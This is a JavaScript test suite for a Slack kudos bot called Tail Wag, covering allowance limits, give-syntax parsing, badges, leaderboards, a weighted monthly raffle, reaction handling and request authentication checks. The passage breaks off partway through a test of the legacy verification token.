/**
 * Tail Wag — test suite.
 * Run with: node test/run.js
 */

const { createEnvironment } = require('./harness');

let passed = 0;
let failed = 0;
const failures = [];
let currentSuite = '';

function suite(name) { currentSuite = name; console.log(`\n\x1b[1m${name}\x1b[0m`); }

function test(name, fn) {
  try {
    fn();
    passed++;
    console.log(`  \x1b[32m✓\x1b[0m ${name}`);
  } catch (e) {
    failed++;
    failures.push({ suite: currentSuite, name, error: e });
    console.log(`  \x1b[31m✗\x1b[0m ${name}`);
    console.log(`      \x1b[31m${e.message}\x1b[0m`);
  }
}

function assert(cond, msg) {
  if (!cond) throw new Error(msg || 'assertion failed');
}
function eq(actual, expected, msg) {
  if (actual !== expected) {
    throw new Error(`${msg || 'not equal'}\n      expected: ${JSON.stringify(expected)}\n      actual:   ${JSON.stringify(actual)}`);
  }
}
function includes(haystack, needle, msg) {
  if (String(haystack).indexOf(needle) === -1) {
    throw new Error(`${msg || 'missing substring'}\n      looked for: ${needle}\n      in:         ${String(haystack).slice(0, 400)}`);
  }
}

/** A fresh, fully-configured environment with a small cast of people. */
function freshEnv(overrides = {}) {
  const env = createEnvironment({ now: new Date('2026-09-16T18:00:00Z') }); // Wed
  env.setup();
  env.setConfigValue('SLACK_BOT_TOKEN', 'xoxb-test');
  env.setConfigValue('ALLOWED_TEAM_ID', 'T_TEST');
  env.setConfigValue('URL_SECRET', 'secret123');
  env.setConfigValue('ANNOUNCE_CHANNEL', '#kudos');
  Object.keys(overrides).forEach((k) => env.setConfigValue(k, overrides[k]));
  env.addUser('U08JOSH1', 'josh');
  env.addUser('U08SAM01', 'sam');
  env.addUser('U08DANA1', 'dana');
  env.addUser('U08LEE01', 'lee');
  env.addUser('U08BOT01', 'helperbot', { is_bot: true });
  env.addUser('U08GONE1', 'leaver', { deleted: true });
  env.clearFetches();
  return env;
}

function slashCommand(env, command, text, extra = {}) {
  return env.call('routeCommand_', Object.assign({
    command, text,
    user_id: 'U08JOSH1', user_name: 'josh',
    channel_id: 'C_GENERAL', channel_name: 'general',
    team_id: 'T_TEST', response_url: 'https://hooks.slack.test/r'
  }, extra));
}

function body(out) { return JSON.parse(out.getContent()); }

// ===========================================================================
suite('Time and period keys');
// ===========================================================================

test('week key changes exactly at the Monday boundary, in the configured timezone', () => {
  const env = freshEnv();
  // Sunday 2026-09-20 23:00 Denver = Monday 05:00 UTC
  env.setNow(new Date('2026-09-21T05:00:00Z'));
  const sundayNight = env.call('weekKey_');
  // Monday 2026-09-21 00:30 Denver = Monday 06:30 UTC
  env.setNow(new Date('2026-09-21T06:30:00Z'));
  const mondayMorning = env.call('weekKey_');
  assert(sundayNight !== mondayMorning,
    `week should turn over at local Monday midnight, got ${sundayNight} both sides`);
});

test('week key is stable across a single week', () => {
  const env = freshEnv();
  env.setNow(new Date('2026-09-15T12:00:00Z')); // Tue
  const a = env.call('weekKey_');
  env.setNow(new Date('2026-09-18T12:00:00Z')); // Fri
  eq(env.call('weekKey_'), a, 'Tuesday and Friday of one week should share a key');
});

test('week key handles the year boundary without collapsing two weeks together', () => {
  const env = freshEnv();
  env.setNow(new Date('2026-12-30T18:00:00Z'));
  const dec = env.call('weekKey_');
  env.setNow(new Date('2027-01-06T18:00:00Z'));
  const jan = env.call('weekKey_');
  assert(dec !== jan, 'weeks either side of New Year must differ');
});

test('daily mode keys on the calendar day', () => {
  const env = freshEnv({ ALLOWANCE_PERIOD: 'day' });
  env.setNow(new Date('2026-09-16T18:00:00Z'));
  eq(env.call('periodKey_'), '2026-09-16');
  env.setNow(new Date('2026-09-17T18:00:00Z'));
  eq(env.call('periodKey_'), '2026-09-17');
});

test('prevPeriodKey_ steps back one day in daily mode and one week in weekly mode', () => {
  const daily = freshEnv({ ALLOWANCE_PERIOD: 'day' });
  daily.setNow(new Date('2026-09-16T18:00:00Z'));
  eq(daily.call('prevPeriodKey_'), '2026-09-15');

  const weekly = freshEnv();
  weekly.setNow(new Date('2026-09-16T18:00:00Z'));
  const thisWeek = weekly.call('periodKey_');
  assert(weekly.call('prevPeriodKey_') !== thisWeek, 'previous week must differ from this week');
});

test('month key and previous month key roll over January correctly', () => {
  const env = freshEnv();
  env.setNow(new Date('2026-01-15T18:00:00Z'));
  eq(env.call('monthKey_'), '2026-01');
  eq(env.call('prevMonthKey_'), '2025-12');
});

// ===========================================================================
suite('Parsing the give syntax');
// ===========================================================================

test('pulls out one recipient and the reason', () => {
  const env = freshEnv();
  const p = env.call('parseGive_', '<@U08SAM01> covered two sessions at no notice');
  eq(p.userIds.length, 1);
  eq(p.userIds[0], 'U08SAM01');
  eq(p.dots, 1);
  eq(p.reason, 'covered two sessions at no notice');
});

test('handles the piped mention form Slack actually sends', () => {
  const env = freshEnv();
  const p = env.call('parseGive_', '<@U08SAM01|sam> nailed the parent meeting today');
  eq(p.userIds[0], 'U08SAM01');
  eq(p.reason, 'nailed the parent meeting today');
});

test('several recipients, deduplicated, order preserved', () => {
  const env = freshEnv();
  const p = env.call('parseGive_', '<@U08SAM01> <@U08DANA1> <@U08SAM01> split the weekend between them');
  eq(p.userIds.length, 2);
  eq(p.userIds[0], 'U08SAM01');
  eq(p.userIds[1], 'U08DANA1');
});

test('x2 sets the count and is stripped from the reason', () => {
  const env = freshEnv();
  const p = env.call('parseGive_', '<@U08SAM01> x2 covered the whole weekend alone');
  eq(p.dots, 2);
  eq(p.explicitCount, true);
  eq(p.reason, 'covered the whole weekend alone');
});

test('repeated trigger emoji set the count', () => {
  const env = freshEnv();
  const p = env.call('parseGive_',
    '<@U08SAM01> :jackson::jackson::jackson: three whole sessions covered');
  eq(p.dots, 3);
  eq(p.reason, 'three whole sessions covered');
});

test('a single trigger emoji still means one tailwag', () => {
  const env = freshEnv();
  const p = env.call('parseGive_', '<@U08SAM01> :jackson: saved the Denver auth today');
  eq(p.dots, 1);
});

test('a numeral inside the reason is not mistaken for a count', () => {
  const env = freshEnv();
  const p = env.call('parseGive_', '<@U08SAM01> covered 3 sessions on Tuesday afternoon');
  eq(p.dots, 1, 'a bare number in prose must not become a multiplier');
  eq(p.reason, 'covered 3 sessions on Tuesday afternoon');
});

test('value tags are recognized, resolved and removed from the reason', () => {
  const env = freshEnv();
  const p = env.call('parseGive_', '<@U08SAM01> #real-world made the plan work at the daycare');
  assert(p.value, 'value should resolve');
  eq(p.value.tag, 'real-world');
  eq(p.reason, 'made the plan work at the daycare');
});

test('a value tag prefix resolves to the full value', () => {
  const env = freshEnv();
  const p = env.call('parseGive_', '<@U08SAM01> #collab worked brilliantly with the school');
  assert(p.value, 'prefix should resolve');
  eq(p.value.tag, 'collaborate');
});

test('an unknown hashtag stays in the reason rather than being swallowed', () => {
  const env = freshEnv();
  const p = env.call('parseGive_', '<@U08SAM01> #nonsense did a great job this week');
  eq(p.value, null);
  includes(p.reason, '#nonsense');
});

test('a channel link is not mistaken for a value tag', () => {
  const env = freshEnv();
  const p = env.call('parseGive_', '<@U08SAM01> unblocked everyone in <#C_GENERAL|general> this morning');
  eq(p.value, null, 'a #channel reference must not resolve as a value');
});

test('@channel and @here are detected so they can be refused', () => {
  const env = freshEnv();
  const p = env.call('parseGive_', '<!channel> everybody did great work today');
  eq(p.broadcasts.length, 1);
});

test('an unlinkified @handle is captured so the user gets a useful error', () => {
  const env = freshEnv();
  const p = env.call('parseGive_', '@sam did something great this afternoon');
  eq(p.userIds.length, 0);
  eq(p.bareHandles[0], 'sam');
});

test('a link in the reason is rendered as its label', () => {
  const env = freshEnv();
  const p = env.call('parseGive_', '<@U08SAM01> see <https://actaba.com|the new site> for the rewrite');
  includes(p.reason, 'the new site');
  assert(p.reason.indexOf('https://') === -1, 'raw URL markup should not survive');
});

// ===========================================================================
suite('Validation rules');
// ===========================================================================

test('a reason under the minimum is refused, with an example', () => {
  const env = freshEnv();
  const out = slashCommand(env, '/wag', '<@U08SAM01> ty');
  const b = body(out);
  eq(b.response_type, 'ephemeral');
  includes(b.text, 'Add a reason');
  includes(b.text, '/wag <@U08SAM01>');
});

test('self-kudos is refused', () => {
  const env = freshEnv();
  const b = body(slashCommand(env, '/wag', '<@U08JOSH1> I did a wonderful job today'));
  includes(b.text, 'No tailwags for yourself');
});

test('@channel is refused', () => {
  const env = freshEnv();
  const b = body(slashCommand(env, '/wag', '<!channel> everyone was brilliant this week'));
  includes(b.text, 'not to `@channel`');
});

test('too many recipients in one command is refused', () => {
  const env = freshEnv({ MAX_RECIPIENTS_PER_MESSAGE: 2 });
  const b = body(slashCommand(env, '/wag',
    '<@U08SAM01> <@U08DANA1> <@U08LEE01> all three covered for me this week'));
  includes(b.text, 'the limit is 2');
});

test('a value tag can be made mandatory', () => {
  const env = freshEnv({ VALUE_REQUIRED: true });
  const b = body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice'));
  includes(b.text, 'Tag the value');
  includes(b.text, '#real-world');
});

test('PAUSED refuses new tailwags but leaves lookups working', () => {
  const env = freshEnv({ PAUSED: true });
  const give = body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice'));
  includes(give.text, 'paused');
  const look = body(slashCommand(env, '/wags', 'leaderboard'));
  assert(look.text.indexOf('paused') === -1, 'leaderboards should still answer while paused');
});

// ===========================================================================
suite('Giving tailwags');
// ===========================================================================

test('a valid tailwag lands, announces in channel, and debits the giver', () => {
  const env = freshEnv();
  const b = body(slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice'));
  eq(b.response_type, 'in_channel');
  includes(JSON.stringify(b.blocks), 'U08SAM01');
  includes(JSON.stringify(b.blocks), 'covered two sessions at no notice');

  const bal = env.call('getBalance_', 'U08JOSH1', 'josh');
  eq(env.call('num_', bal.remaining), 4, 'giver should have 4 of 5 left');
  eq(env.call('num_', bal.given_total), 1);

  const sam = env.call('getBalance_', 'U08SAM01', 'sam');
  eq(env.call('num_', sam.received_total), 1);
  eq(env.call('num_', sam.received_this_period), 1);
});

test('the ledger records the give with its reason and value', () => {
  const env = freshEnv();
  slashCommand(env, '/wag', '<@U08SAM01> #bigger-lives got him ordering his own lunch');
  const rows = env.sheetRows('Ledger');
  eq(rows.length, 1);
  eq(String(rows[0].giver_id), 'U08JOSH1');
  eq(String(rows[0].receiver_id), 'U08SAM01');
  eq(env.call('num_', rows[0].dots), 1);
  eq(String(rows[0].value_tag), 'bigger-lives');
  includes(String(rows[0].reason), 'ordering his own lunch');
});

test('the weekly allowance is enforced', () => {
  const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  for (let i = 0; i < 5; i++) {
    slashCommand(env, '/wag', `<@U08SAM01> great work on thing number ${i} this week`);
  }
  const b = body(slashCommand(env, '/wag', '<@U08SAM01> one more great thing this week'));
  eq(b.response_type, 'ephemeral', 'the sixth tailwag must not be announced');
  includes(b.text, 'out of tailwags');

  const sam = env.call('getBalance_', 'U08SAM01', 'sam');
  eq(env.call('num_', sam.received_total), 5, 'exactly five should have landed');
});

test('the per-recipient cap stops one person soaking up the whole allowance', () => {
  const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 2 });
  slashCommand(env, '/wag', '<@U08SAM01> first excellent thing this week');
  slashCommand(env, '/wag', '<@U08SAM01> second excellent thing this week');
  const b = body(slashCommand(env, '/wag', '<@U08SAM01> third excellent thing this week'));
  includes(b.text, 'already given them');

  const sam = env.call('getBalance_', 'U08SAM01', 'sam');
  eq(env.call('num_', sam.received_total), 2);
  const josh = env.call('getBalance_', 'U08JOSH1', 'josh');
  eq(env.call('num_', josh.remaining), 3, 'the refused tailwag must not be debited');
});

test('the per-recipient cap trims an over-sized give rather than refusing it', () => {
  const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 2 });
  const b = body(slashCommand(env, '/wag', '<@U08SAM01> x3 carried the whole week single handed'));
  eq(b.response_type, 'in_channel');
  const sam = env.call('getBalance_', 'U08SAM01', 'sam');
  eq(env.call('num_', sam.received_total), 2, 'should be trimmed to the cap, not refused');
});

test('a partial give works: what fits lands, the rest is reported back', () => {
  const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  // Spend down to one tailwag.
  for (let i = 0; i < 4; i++) slashCommand(env, '/wag', `<@U08LEE01> thing number ${i} done well`);
  env.clearFetches();

  slashCommand(env, '/wag', '<@U08SAM01> <@U08DANA1> you both covered for me this week');
  const sam = env.call('getBalance_', 'U08SAM01', 'sam');
  const dana = env.call('getBalance_', 'U08DANA1', 'dana');
  eq(env.call('num_', sam.received_total) + env.call('num_', dana.received_total), 1,
    'only one tailwag was left, so exactly one should have landed');

  const ephemerals = env.fetchesTo('chat.postEphemeral');
  assert(ephemerals.length >= 1, 'the giver should be told what was skipped');
  includes(JSON.stringify(ephemerals[ephemerals.length - 1].payload), 'out of tailwags');
});

test('multiple recipients each get the full amount when there is room', () => {
  const env = freshEnv();
  slashCommand(env, '/wag', '<@U08SAM01> <@U08DANA1> you both covered the weekend between you');
  eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 1);
  eq(env.call('num_', env.call('getBalance_', 'U08DANA1', 'dana').received_total), 1);
  eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').remaining), 3);
});

test('bots cannot receive tailwags', () => {
  const env = freshEnv();
  const b = body(slashCommand(env, '/wag', '<@U08BOT01> you are a wonderful little robot'));
  includes(b.text, 'Bots do not collect tailwags');
});

test('deactivated accounts cannot receive tailwags', () => {
  const env = freshEnv();
  const b = body(slashCommand(env, '/wag', '<@U08GONE1> thanks for everything you did here'));
  includes(b.text, 'deactivated');
});

test('managers draw from their own pool', () => {
  const env = freshEnv({ MANAGER_USER_IDS: 'U08JOSH1', ALLOWANCE_MANAGER: 8, ALLOWANCE_PEER: 3 });
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
  const josh = env.call('getBalance_', 'U08JOSH1', 'josh');
  eq(String(josh.pool), 'manager');
  eq(env.call('num_', josh.allowance), 8);
  eq(env.call('num_', josh.remaining), 7);

  const sam = env.call('getBalance_', 'U08SAM01', 'sam');
  eq(env.call('num_', sam.allowance), 3, 'a peer keeps the peer allowance');
});

test('allowance refills when the period turns over, and unused tailwags expire', () => {
  const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
  eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').remaining), 4);

  env.setNow(new Date('2026-09-23T18:00:00Z')); // next Wednesday
  const after = env.call('getBalance_', 'U08JOSH1', 'josh');
  eq(env.call('num_', after.remaining), 5, 'a new week should refill');
  eq(env.call('num_', after.spent_this_period), 0);
  eq(env.call('num_', after.given_total), 1, 'lifetime totals must survive the reset');
});

test('carry-over rolls unused tailwags forward when switched on', () => {
  const env = freshEnv({ CARRY_OVER_UNUSED: true, MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
  env.setNow(new Date('2026-09-23T18:00:00Z'));
  const after = env.call('getBalance_', 'U08JOSH1', 'josh');
  eq(env.call('num_', after.remaining), 9, '4 carried forward plus a fresh 5');
});

test('the per-recipient cap resets with the period', () => {
  const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 1 });
  slashCommand(env, '/wag', '<@U08SAM01> first excellent thing this week');
  const blocked = body(slashCommand(env, '/wag', '<@U08SAM01> second excellent thing this week'));
  includes(blocked.text, 'already given them');

  env.setNow(new Date('2026-09-23T18:00:00Z'));
  const next = body(slashCommand(env, '/wag', '<@U08SAM01> a brand new week, a brand new tailwag'));
  eq(next.response_type, 'in_channel', 'the cap should have reset with the week');
});

test('the received-this-period counter resets but totals do not', () => {
  const env = freshEnv();
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
  env.setNow(new Date('2026-09-23T18:00:00Z'));
  const sam = env.call('getBalance_', 'U08SAM01', 'sam');
  eq(env.call('num_', sam.received_this_period), 0);
  eq(env.call('num_', sam.received_total), 1);
});

test('daily mode refills every day', () => {
  const env = freshEnv({ ALLOWANCE_PERIOD: 'day', MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  for (let i = 0; i < 5; i++) slashCommand(env, '/wag', `<@U08SAM01> good thing number ${i} today`);
  const spent = body(slashCommand(env, '/wag', '<@U08SAM01> one more good thing today'));
  includes(spent.text, 'out of tailwags');

  env.setNow(new Date('2026-09-17T18:00:00Z'));
  const tomorrow = body(slashCommand(env, '/wag', '<@U08SAM01> a fresh day and a fresh tailwag'));
  eq(tomorrow.response_type, 'in_channel');
});

// ===========================================================================
suite('Badges and streaks');
// ===========================================================================

test('a badge is awarded on crossing its threshold, exactly once', () => {
  const env = freshEnv({ BADGE_THRESHOLDS: '3', BADGE_LABELS: 'Pilot Light', BADGE_EMOJI: ':jackson:', MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  slashCommand(env, '/wag', '<@U08SAM01> first good thing this week');
  slashCommand(env, '/wag', '<@U08SAM01> second good thing this week');
  eq(env.sheetRows('Badges').length, 0, 'not yet at the threshold');

  const third = body(slashCommand(env, '/wag', '<@U08SAM01> third good thing this week'));
  includes(JSON.stringify(third.blocks), 'Pilot Light');
  eq(env.sheetRows('Badges').length, 1);

  slashCommand(env, '/wag', '<@U08SAM01> fourth good thing this week');
  eq(env.sheetRows('Badges').length, 1, 'a badge must not be awarded twice');
});

test('giving badges track generosity separately from popularity', () => {
  const env = freshEnv({
    GIVER_BADGE_THRESHOLDS: '2', GIVER_BADGE_LABELS: 'Noticer', GIVER_BADGE_EMOJI: ':eyes:',
    MAX_PER_RECIPIENT_PER_PERIOD: 0
  });
  slashCommand(env, '/wag', '<@U08SAM01> first good thing this week');
  const second = body(slashCommand(env, '/wag', '<@U08DANA1> second good thing this week'));
  includes(JSON.stringify(second.blocks), 'Noticer');
  const rows = env.sheetRows('Badges').filter((r) => String(r.track) === 'giver');
  eq(rows.length, 1);
  eq(String(rows[0].user_id), 'U08JOSH1');
});

test('a giving streak extends across consecutive periods and resets after a gap', () => {
  const env = freshEnv();
  slashCommand(env, '/wag', '<@U08SAM01> week one good thing happened');
  eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').streak), 1);

  env.setNow(new Date('2026-09-23T18:00:00Z'));
  slashCommand(env, '/wag', '<@U08SAM01> week two good thing happened');
  eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').streak), 2);

  env.setNow(new Date('2026-10-14T18:00:00Z')); // three weeks later
  slashCommand(env, '/wag', '<@U08SAM01> week five good thing happened');
  eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').streak), 1, 'a gap resets the streak');
});

test('giving twice in one period does not double-count the streak', () => {
  const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  slashCommand(env, '/wag', '<@U08SAM01> first good thing this week');
  slashCommand(env, '/wag', '<@U08SAM01> second good thing this week');
  eq(env.call('num_', env.call('getBalance_', 'U08JOSH1', 'josh').streak), 1);
});

// ===========================================================================
suite('Leaderboards');
// ===========================================================================

test('ranks by tailwags received, with ties sharing a rank', () => {
  const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  slashCommand(env, '/wag', '<@U08SAM01> x2 two tailwags for sam this week');
  slashCommand(env, '/wag', '<@U08DANA1> one tailwag for dana this week');
  slashCommand(env, '/wag', '<@U08LEE01> one tailwag for lee this week');

  const rows = env.call('leaderboard_', 'period', 10);
  eq(rows[0].user_id, 'U08SAM01');
  eq(rows[0].dots, 2);
  eq(rows[0].rank, 1);
  eq(rows[1].rank, 2);
  eq(rows[2].rank, 2, 'a tie shares the rank');
});

test('people with no tailwags are left off the board', () => {
  const env = freshEnv();
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
  const rows = env.call('leaderboard_', 'period', 10);
  eq(rows.length, 1);
  eq(rows[0].user_id, 'U08SAM01');
});

test('the generosity board ranks givers', () => {
  const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  slashCommand(env, '/wag', '<@U08SAM01> x2 two good things this week');
  slashCommand(env, '/wag', '<@U08DANA1> another good thing this week', { user_id: 'U08LEE01', user_name: 'lee' });
  const rows = env.call('giverLeaderboard_', 10);
  eq(rows[0].user_id, 'U08JOSH1');
  eq(rows[0].dots, 2);
});

test('the all-time board survives a period rollover', () => {
  const env = freshEnv();
  slashCommand(env, '/wag', '<@U08SAM01> covered two sessions at no notice');
  env.setNow(new Date('2026-09-23T18:00:00Z'));
  env.run('cacheDropAll_();');
  eq(env.call('leaderboard_', 'period', 10).length, 0, 'the new week starts empty');
  eq(env.call('leaderboard_', 'all', 10)[0].user_id, 'U08SAM01');
});

// ===========================================================================
suite('The raffle');
// ===========================================================================

test('each tailwag received is one entry', () => {
  const env = freshEnv({ MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  slashCommand(env, '/wag', '<@U08SAM01> x3 three tailwags means three entries');
  eq(env.call('myRaffleEntries_', 'U08SAM01', env.call('monthKey_')), 3);
});

test('the per-person entry cap is respected', () => {
  const env = freshEnv({ RAFFLE_MAX_ENTRIES_PER_PERSON: 2, MAX_PER_RECIPIENT_PER_PERIOD: 0 });
  slashCommand(env, '/wag', '<@U08SAM01> x3 three tailwags but only two entries');
  eq(env.call('myRaffleEntries_', 'U08SAM01', env.call('monthKey_')), 2);
});

test('the draw is weighted by entries', () => {
  const env = freshEnv({ RAFFLE_MIN_ENTRIES_TO_DRAW: 0, RAFFLE_EXCLUDE_LAST_WINNER: false });
  const period = env.call('monthKey_');
  env.call('addRaffleEntries_', 'U08SAM01', 'sam', 9, period);
  env.call('addRaffleEntries_', 'U08DANA1', 'dana', 1, period);

  // 0.95 of 10 entries lands past Sam's nine tickets, so Dana wins.
  env.setRandom([0.95]);
  const res = env.call('runRaffleDraw_', period, true);
  eq(res.winners.length, 1);
  eq(String(res.winners[0].user_id), 'U08DANA1');

  // 0.1 lands inside Sam's block.
  const env2 = freshEnv({ RAFFLE_MIN_ENTRIES_TO_DRAW: 0, RAFFLE_EXCLUDE_LAST_WINNER: false });
  const p2 = env2.call('monthKey_');
  env2.call('addRaffleEntries_', 'U08SAM01', 'sam', 9, p2);
  env2.call('addRaffleEntries_', 'U08DANA1', 'dana', 1, p2);
  env2.setRandom([0.1]);
  eq(String(env2.call('runRaffleDraw_', p2, true).winners[0].user_id), 'U08SAM01');
});

test('a month under the minimum is not drawn', () => {
  const env = freshEnv({ RAFFLE_MIN_ENTRIES_TO_DRAW: 5 });
  const period = env.call('monthKey_');
  env.call('addRaffleEntries_', 'U08SAM01', 'sam', 2, period);
  const res = env.call('runRaffleDraw_', period, false);
  eq(res.ok, false);
  includes(res.message, 'under the minimum');
});

test('a month is not drawn twice', () => {
  const env = freshEnv({ RAFFLE_MIN_ENTRIES_TO_DRAW: 0, RAFFLE_EXCLUDE_LAST_WINNER: false });
  const period = env.call('monthKey_');
  env.call('addRaffleEntries_', 'U08SAM01', 'sam', 3, period);
  eq(env.call('runRaffleDraw_', period, true).ok, true);
  const second = env.call('runRaffleDraw_', period, false);
  eq(second.ok, false);
  includes(second.message, 'already been drawn');
});

test('multiple winners are distinct', () => {
  const env = freshEnv({
    RAFFLE_MIN_ENTRIES_TO_DRAW: 0, RAFFLE_WINNERS_PER_DRAW: 2, RAFFLE_EXCLUDE_LAST_WINNER: false
  });
  const period = env.call('monthKey_');
  env.call('addRaffleEntries_', 'U08SAM01', 'sam', 5, period);
  env.call('addRaffleEntries_', 'U08DANA1', 'dana', 5, period);
  env.setRandom([0.1, 0.9]);
  const res = env.call('runRaffleDraw_', period, true);
  eq(res.winners.length, 2);
  assert(String(res.winners[0].user_id) !== String(res.winners[1].user_id),
    'the same person must not win twice in one draw');
});

test('last month\'s winner can be excluded from this month\'s drum', () => {
  const env = freshEnv({ RAFFLE_MIN_ENTRIES_TO_DRAW: 0, RAFFLE_EXCLUDE_LAST_WINNER: true });
  env.call('addRaffleEntries_', 'U08SAM01', 'sam', 5, '2026-08');
  env.call('runRaffleDraw_', '2026-08', true);

  env.call('addRaffleEntries_', 'U08SAM01', 'sam', 9, '2026-09');
  env.call('addRaffleEntries_', 'U08DANA1', 'dana', 1, '2026-09');
  env.setRandom([0.5]);
  const res = env.call('runRaffleDraw_', '2026-09', true);
  eq(String(res.winners[0].user_id), 'U08DANA1',
    'August\'s winner should be out of September\'s drum despite having more entries');
});

// ===========================================================================
suite('Emoji and reaction giving');
// ===========================================================================

test('typing the emoji with a mention in any channel gives a tailwag', () => {
  const env = freshEnv();
  env.call('handleEvent_', {
    type: 'event_callback',
    team_id: 'T_TEST',
    event: {
      type: 'message', user: 'U08JOSH1', channel: 'C_GENERAL', ts: '1758000000.000100',
      text: '<@U08SAM01> :jackson: saved me two hours on the auth today'
    }
  });
  eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 1);
  const posts = env.fetchesTo('chat.postMessage');
  assert(posts.length >= 1, 'it should announce in the channel');
  eq(posts[0].payload.thread_ts, '1758000000.000100', 'the announcement should thread off the message');
});

test('a redelivered message event does not award twice', () => {
  const env = freshEnv();
  const event = {
    type: 'event_callback',
    team_id: 'T_TEST',
    event: {
      type: 'message', user: 'U08JOSH1', channel: 'C_GENERAL', ts: '1758000000.000200',
      text: '<@U08SAM01> :jackson: saved me two hours on the auth today'
    }
  };
  env.call('handleEvent_', event);
  env.call('handleEvent_', event);   // Slack's retry
  eq(env.call('num_', env.call('getBalance_', 'U08SAM01', 'sam').received_total), 1,
    'a retry must be dropped, not counted');
});

test('a message without the trigger emoji is ignored entirely', () => {
  const env = freshEnv();
  env.call('handleEvent_', {
    type: 'event_callback', team_id: 'T_TEST',
    event: {
      type: 'message', user: 'U08JOSH1', channel: 'C_GENERAL', ts: '1758000000.000300',
      text: '<@U08SAM01> thanks for the help today, that was great'
    }
  });
  eq(env.sheetRows('Ledger').length, 0);
});

test('bot messages and edits are ignored', () => {
  const env = freshEnv();
  env.call('handleEvent_', {
    type: 'event_callback', team_id: 'T_TEST',
    event: {
      type: 'message', subtype: 'message_changed', user: 'U08JOSH1', channel: 'C_GENERAL',
      ts: '1758000000.000400', text: '<@U08SAM01> :jackson: edited into existence'
    }
  });
  env.call('handleEvent_', {
    type: 'event_callback', team_id: 'T_TEST',
    event: {
      type: 'message', bot_id: 'B123', channel: 'C_GENERAL', ts: '1758000000.000500',
      text: '<@U08SAM01> :jackson: posted by a bot'
    }
  });
  eq(env.sheetRows('Ledger').length, 0);
});

test('reacting with the trigger emoji gives the author a tailwag, using their message as the reason', () => {
  const env = freshEnv();
  env.call('handleEvent_', {
    type: 'event_callback', team_id: 'T_TEST',
    event: {
      type: 'reaction_added', user: 'U08JOSH1', reaction: 'jackson',
      item_user: 'U08SAM01', item: { type: 'message', channel: 'C_GENERAL', ts: '1758000001.000100' }
    }
  });
  const rows = env.sheetRows('Ledger');
  eq(rows.length, 1);
  eq(String(rows[0].source), 'reaction');
  includes(String(rows[0].reason), 'the message that was reacted to');
});

test('reacting to your own message gives nothing', () => {
  const env = freshEnv();
  env.call('handleEvent_', {
    type: 'event_callback', team_id: 'T_TEST',
    event: {
      type: 'reaction_added', user: 'U08JOSH1', reaction: 'jackson',
      item_user: 'U08JOSH1', item: { type: 'message', channel: 'C_GENERAL', ts: '1758000002.000100' }
    }
  });
  eq(env.sheetRows('Ledger').length, 0);
});

test('a different reaction emoji is ignored', () => {
  const env = freshEnv();
  env.call('handleEvent_', {
    type: 'event_callback', team_id: 'T_TEST',
    event: {
      type: 'reaction_added', user: 'U08JOSH1', reaction: 'thumbsup',
      item_user: 'U08SAM01', item: { type: 'message', channel: 'C_GENERAL', ts: '1758000003.000100' }
    }
  });
  eq(env.sheetRows('Ledger').length, 0);
});

// ===========================================================================
suite('Request authentication');
// ===========================================================================

test('a request without the URL secret is rejected', () => {
  const env = freshEnv();
  const out = env.call('doPost', {
    parameter: { command: '/wag', text: '<@U08SAM01> a perfectly good reason here', user_id: 'U08JOSH1', team_id: 'T_TEST' },
    postData: { type: 'application/x-www-form-urlencoded', contents: '' }
  });
  eq(out.getContent(), 'unauthorized');
  eq(env.sheetRows('Ledger').length, 0);
});

test('a request with the wrong URL secret is rejected', () => {
  const env = freshEnv();
  const out = env.call('doPost', {
    parameter: { k: 'wrong', command: '/wag', text: '<@U08SAM01> a perfectly good reason here', user_id: 'U08JOSH1', team_id: 'T_TEST' },
    postData: { type: 'application/x-www-form-urlencoded', contents: '' }
  });
  eq(out.getContent(), 'unauthorized');
});

test('a request from another workspace is rejected even with the right secret', () => {
  const env = freshEnv();
  const out = env.call('doPost', {
    parameter: {
      k: 'secret123', command: '/wag', text: '<@U08SAM01> a perfectly good reason here',
      user_id: 'U08JOSH1', team_id: 'T_SOMEONE_ELSE'
    },
    postData: { type: 'application/x-www-form-urlencoded', contents: '' }
  });
  eq(out.getContent(), 'unauthorized');
});

test('a correctly signed request goes through', () => {
  const env = freshEnv();
  const out = env.call('doPost', {
    parameter: {
      k: 'secret123', command: '/wag', text: '<@U08SAM01> covered two sessions at no notice',
      user_id: 'U08JOSH1', user_name: 'josh', channel_id: 'C_GENERAL', channel_name: 'general',
      team_id: 'T_TEST'
    },
    postData: { type: 'application/x-www-form-urlencoded', contents: '' }
  });
  eq(body(out).response_type, 'in_channel');
});

test('the legacy verification token is checked when configured', () => {
  const env = freshEnv({ SLACK_VERIFICATION_TOKEN: 'vtoken' });
  const bad = env.call('doPost', {
    parameter: {
      k: 'secret123', command: '/wag', text: '<@U08SAM01> covered two sessions at no notice',
      user_id: 'U08JOSH1', team_id: 'T_TEST', token: 'nope'
    },
    postData: { type: 'application/x-www-form-urlencoded', contents: '' }
  });
